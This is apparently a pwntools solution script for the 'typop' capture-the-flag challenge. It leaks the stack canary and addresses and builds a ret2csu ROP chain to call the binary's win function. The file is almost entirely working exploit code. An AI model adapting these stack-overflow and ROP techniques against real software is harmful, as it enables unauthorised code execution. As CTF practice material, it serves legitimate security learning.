from pwn import *

target = process('./chall')

pid = gdb.attach(target, 'b *getFeedback+70\nb *getFeedback+172\nb *getFeedback+199\ncontinue')

elf = ELF('chall')
libc = ELF('libc-2.31.so')
#target = remote('typop.chal.idek.team', 1337)

print(target.recvuntil(b'complete a survey?'))

target.sendline(b'y')
print(target.recvuntil(b'ctf?'))
payload1 = b'a' * 11
target.send(payload1)

print(target.recvuntil(payload1))

leak = target.recv(7)
canary = u64(b'\x00' + leak)
print(hex(canary))
#Only needed for ret2csu
stack_leak = u64(target.recv(6) + b'\x00' * 2)
print(hex(stack_leak))

payload2 = cyclic(100)
padding = b'a' * 10
payload2 = padding
payload2 += p64(canary)
payload2 += b'a' * 8

payload2 += b'\x42'
target.send(payload2) 

print(target.recvuntil(b'ctf?'))
payload3 = b'a' * 0x1a
target.send(payload3)
print(target.recvuntil(payload3))
leak = target.recv(6)
print(leak)
main_55 = u64(leak + b'\x00' * 2)
pie_base = main_55 - elf.symbols['main'] - 55
pop_rdi = pie_base + 0x00000000000014d3
pop_rsi_r15 = pie_base + 0x00000000000014d1
writable = pie_base + elf.bss()
print(hex(pop_rdi))

csu_pops = pie_base + 0x014ca
csu_movs = pie_base + 0x014b0

payload4 = padding
payload4 += p64(canary)
payload4 += p64(pie_base+elf.symbols['win'])
payload4 += p64(csu_pops)
payload4 += p64(0) #rbx
payload4 += p64(1) #rbp
payload4 += p64(ord('f')) #r12 => edi
payload4 += p64(ord('l')) #r13 => rsi
payload4 += p64(ord('a')) #r14 => rdx
payload4 += p64(stack_leak - 0x10) #r15, points to win and called
payload4 += p64(csu_movs)
target.send(payload4)
target.interactive()
